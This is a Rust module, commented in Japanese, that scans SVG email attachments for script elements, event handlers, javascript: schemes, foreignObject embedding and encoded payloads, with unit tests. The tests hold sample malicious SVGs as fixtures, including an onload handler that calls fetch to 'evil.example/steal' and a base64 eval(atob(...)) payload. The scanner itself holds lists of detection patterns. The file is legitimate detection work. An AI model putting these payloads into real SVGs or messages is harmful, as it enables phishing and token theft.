//! SVG 添付攻撃の検出 (2025-2026 に急増した主要ベクタ)。
//!
//! # 脅威
//!
//! SVG は「画像」でありながら XML であり、`<script>`・イベントハンドラ・
//! 外部参照を含められる。ブラウザで開くと JavaScript が実行されるため、
//! 攻撃者は SVG 添付を「無害な画像」に見せかけてフィッシングページを
//! ローカルに展開したりトークンを窃取したりする。
//!
//! ## 規模 (2026 年時点)
//!
//! - 悪意ある SVG 添付は 2024 年比で **50 倍**に増加 (2025 年)
//! - 2026 年 2 月の単一キャンペーンで **120 万通**が **53,000 組織**へ配信
//! - SANS ISC が 2026-06 に MIME 型回避手法を警告
//!
//! ## 観測された回避手法
//!
//! 1. **非推奨 MIME 型でのスクリプト宣言**:
//!    `<script type="application/ecmascript">` — ブラウザは `text/javascript` と
//!    同一に扱うが、多くのスキャナは非推奨型を検査対象にしていない。
//! 2. **多層エンコード**: EML 添付の中に SVG、その中に base64 の iframe。
//! 3. **`<foreignObject>` による HTML 埋め込み**: SVG 内に任意の HTML を持ち込む。
//! 4. **イベントハンドラ**: `onload=` / `onerror=` など `<script>` を使わない実行。
//!
//! # 設計方針
//!
//! SVG 添付は**そもそもメールで受け取る必然性が乏しい**ため、スクリプト要素を
//! 含む SVG は一律に危険と判定する (誤検知よりも見逃しを避ける)。
//! 完全な XML パーサーは使わず、文字列走査で高速に判定する。
//!
//! 出典: SANS ISC (2026-06, Xavier Mertens), OPSWAT, Microsoft 脅威情報 (2026-02)。

use serde::{Deserialize, Serialize};

/// SVG 内で検出されたリスク。
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SvgRisk {
    /// `<script>` 要素を含む。
    ScriptElement {
        /// `type` 属性の値 (省略時は None)。非推奨型による回避検出用。
        script_type: Option<String>,
    },
    /// イベントハンドラ属性 (`onload=` 等) を含む。
    EventHandler {
        /// 検出されたハンドラ名。
        handler: String,
    },
    /// `javascript:` 等の実行可能スキームを参照している。
    DangerousScheme {
        /// 検出されたスキーム。
        scheme: String,
    },
    /// `<foreignObject>` により任意 HTML を埋め込んでいる。
    ForeignObject,
    /// 外部リソースを参照している (トラッキング/追加ペイロード取得)。
    ExternalReference {
        /// 参照先の先頭部分。
        target: String,
    },
    /// base64 等でエンコードされたペイロードを埋め込んでいる。
    EmbeddedEncodedPayload,
}

/// SVG 解析結果。
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SvgScan {
    /// 検出されたリスク一覧。
    pub risks: Vec<SvgRisk>,
    /// 添付として安全に扱えるか (スクリプト系が一つでもあれば false)。
    pub safe_as_attachment: bool,
}

/// 内容が SVG かどうかを判定する。
///
/// `magic_bytes::is_svg` は先頭 256 バイトしか見ないため、長い XML 宣言や
/// コメントで `<svg` を押し下げると検出を回避できてしまう。本関数は
/// より広い範囲 (先頭 8 KB) を走査してこの回避を塞ぐ。
#[must_use]
pub fn looks_like_svg(content: &str) -> bool {
    const SCAN_BYTES: usize = 8 * 1024;
    let end = if content.len() > SCAN_BYTES {
        // UTF-8 境界で安全に切る
        (0..=SCAN_BYTES).rev().find(|&i| content.is_char_boundary(i)).unwrap_or(0)
    } else {
        content.len()
    };
    content[..end].to_ascii_lowercase().contains("<svg")
}

/// SVG の内容を解析して危険な要素を検出する。
///
/// 引数は SVG のテキスト内容。バイナリの場合は UTF-8 として解釈できる範囲で渡す。
#[must_use]
pub fn scan_svg(content: &str) -> SvgScan {
    // DoS 防止: 解析は先頭 512 KB まで。
    const MAX_SCAN_BYTES: usize = 512 * 1024;
    let content = if content.len() > MAX_SCAN_BYTES {
        let end = (0..=MAX_SCAN_BYTES)
            .rev()
            .find(|&i| content.is_char_boundary(i))
            .unwrap_or(0);
        &content[..end]
    } else {
        content
    };

    let lower = content.to_ascii_lowercase();
    let mut risks = Vec::new();

    // 1. <script> 要素 (type 属性も抽出して非推奨型による回避を可視化する)
    if let Some(pos) = lower.find("<script") {
        let script_type = extract_script_type(&lower[pos..]);
        risks.push(SvgRisk::ScriptElement { script_type });
    }

    // 2. イベントハンドラ属性
    //    <script> を使わずに実行できるため、SVG では特に重要。
    const EVENT_HANDLERS: &[&str] = &[
        "onload", "onerror", "onclick", "onmouseover", "onfocus",
        "onanimationstart", "onbegin", "onend", "onrepeat", "onactivate",
    ];
    for handler in EVENT_HANDLERS {
        // `onload=` / `onload =` の両方に対応
        if let Some(pos) = lower.find(handler) {
            let rest = lower[pos + handler.len()..].trim_start();
            if rest.starts_with('=') {
                risks.push(SvgRisk::EventHandler { handler: (*handler).to_string() });
            }
        }
    }

    // 3. 実行可能スキーム
    for scheme in ["javascript:", "vbscript:", "data:text/html"] {
        if lower.contains(scheme) {
            risks.push(SvgRisk::DangerousScheme { scheme: scheme.to_string() });
        }
    }

    // 4. <foreignObject> による HTML 埋め込み
    if lower.contains("<foreignobject") {
        risks.push(SvgRisk::ForeignObject);
    }

    // 5. 外部リソース参照 (トラッキング/追加ペイロード)
    for marker in ["xlink:href=\"http", "href=\"http", "xlink:href='http", "href='http"] {
        if let Some(pos) = lower.find(marker) {
            let snippet: String = lower[pos..].chars().take(80).collect();
            risks.push(SvgRisk::ExternalReference { target: snippet });
            break;
        }
    }

    // 6. 埋め込みエンコードペイロード (多層エンコード回避)
    if lower.contains("base64,") || lower.contains("atob(") || lower.contains("fromcharcode") {
        risks.push(SvgRisk::EmbeddedEncodedPayload);
    }

    // スクリプト実行につながるリスクが一つでもあれば添付として危険。
    let has_execution_risk = risks.iter().any(|r| {
        matches!(
            r,
            SvgRisk::ScriptElement { .. }
                | SvgRisk::EventHandler { .. }
                | SvgRisk::DangerousScheme { .. }
                | SvgRisk::ForeignObject
                | SvgRisk::EmbeddedEncodedPayload
        )
    });

    SvgScan { risks, safe_as_attachment: !has_execution_risk }
}

/// `<script ...>` の `type` 属性値を抽出する。
///
/// 2026 年の回避手法では `type="application/ecmascript"` のように非推奨 MIME 型を
/// 使い、`text/javascript` だけを見るスキャナをすり抜ける。型の値によらず
/// `<script>` 自体を危険と判定するが、監査証跡のため値を保持する。
fn extract_script_type(script_tag_onward: &str) -> Option<String> {
    let type_pos = script_tag_onward.find("type")?;
    // タグの終端を越えていたら type 属性ではない
    let tag_end = script_tag_onward.find('>').unwrap_or(script_tag_onward.len());
    if type_pos > tag_end {
        return None;
    }
    let rest = script_tag_onward[type_pos + 4..].trim_start();
    let rest = rest.strip_prefix('=')?.trim_start();
    let (quote, body) = match rest.chars().next()? {
        q @ ('"' | '\'') => (Some(q), &rest[1..]),
        _ => (None, rest),
    };
    let end = match quote {
        Some(q) => body.find(q)?,
        None => body.find(|c: char| c.is_whitespace() || c == '>').unwrap_or(body.len()),
    };
    Some(body[..end].to_string())
}

// ============================================================================
// テスト
// ============================================================================

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn plain_svg_is_safe() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>"#;
        let scan = scan_svg(svg);
        assert!(scan.safe_as_attachment, "無害な SVG が危険判定された: {:?}", scan.risks);
    }

    #[test]
    fn script_element_detected() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#;
        let scan = scan_svg(svg);
        assert!(!scan.safe_as_attachment);
        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ScriptElement { .. })));
    }

    #[test]
    fn deprecated_mime_type_script_detected() {
        // 2026 年の回避手法: text/javascript ではなく application/ecmascript を使う
        let svg = r#"<svg><script type="application/ecmascript">fetch('//evil')</script></svg>"#;
        let scan = scan_svg(svg);
        assert!(!scan.safe_as_attachment, "非推奨 MIME 型のスクリプトがすり抜けた");
        let found_type = scan.risks.iter().find_map(|r| match r {
            SvgRisk::ScriptElement { script_type } => script_type.clone(),
            _ => None,
        });
        assert_eq!(
            found_type.as_deref(),
            Some("application/ecmascript"),
            "監査証跡として script type が記録されるべき"
        );
    }

    #[test]
    fn event_handler_without_script_tag_detected() {
        // <script> を使わずイベントハンドラだけで実行する手法
        let svg = r#"<svg onload="fetch('https://evil.example/steal')"><rect/></svg>"#;
        let scan = scan_svg(svg);
        assert!(!scan.safe_as_attachment, "onload ハンドラがすり抜けた");
        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::EventHandler { .. })));
    }

    #[test]
    fn javascript_scheme_detected() {
        let svg = r#"<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>"#;
        let scan = scan_svg(svg);
        assert!(!scan.safe_as_attachment);
        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::DangerousScheme { .. })));
    }

    #[test]
    fn foreign_object_detected() {
        let svg = r#"<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">x</body></foreignObject></svg>"#;
        let scan = scan_svg(svg);
        assert!(!scan.safe_as_attachment, "foreignObject による HTML 埋め込みがすり抜けた");
        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ForeignObject)));
    }

    #[test]
    fn encoded_payload_detected() {
        // 多層エンコード (EML → SVG → base64 iframe) の内側
        let svg = r#"<svg><script>eval(atob('ZmV0Y2goJy8vZXZpbCcp'))</script></svg>"#;
        let scan = scan_svg(svg);
        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::EmbeddedEncodedPayload)));
    }

    #[test]
    fn external_reference_flagged_but_not_execution_risk() {
        // 外部参照のみなら実行リスクではない (トラッキング懸念として記録)
        let svg = r#"<svg><image href="https://tracker.example/p.png"/></svg>"#;
        let scan = scan_svg(svg);
        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ExternalReference { .. })));
        assert!(scan.safe_as_attachment, "外部参照だけでは実行リスクとしない");
    }

    #[test]
    fn looks_like_svg_detects_padded_svg() {
        // 回帰: magic_bytes::is_svg は先頭 256 バイトしか見ないため、
        // 長いコメントで <svg を押し下げると検出を回避できた。
        let padding = "<!-- ".to_string() + &"A".repeat(400) + " -->";
        let content = format!("{padding}<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>");
        assert!(
            looks_like_svg(&content),
            "パディングで押し下げられた <svg> が検出されない"
        );
    }

    #[test]
    fn looks_like_svg_rejects_non_svg() {
        assert!(!looks_like_svg("<html><body>hello</body></html>"));
        assert!(!looks_like_svg(""));
    }

    #[test]
    fn oversized_svg_does_not_panic() {
        // DoS 防止パスがパニックしないこと
        let huge = format!("<svg>{}</svg>", "x".repeat(600_000));
        let scan = scan_svg(&huge);
        let _ = scan.safe_as_attachment;
    }

    #[test]
    fn multibyte_content_does_not_panic() {
        // UTF-8 境界処理の安全性
        let svg = format!("<svg><text>{}</text></svg>", "日本語テキスト".repeat(100));
        let scan = scan_svg(&svg);
        assert!(scan.safe_as_attachment);
    }
}
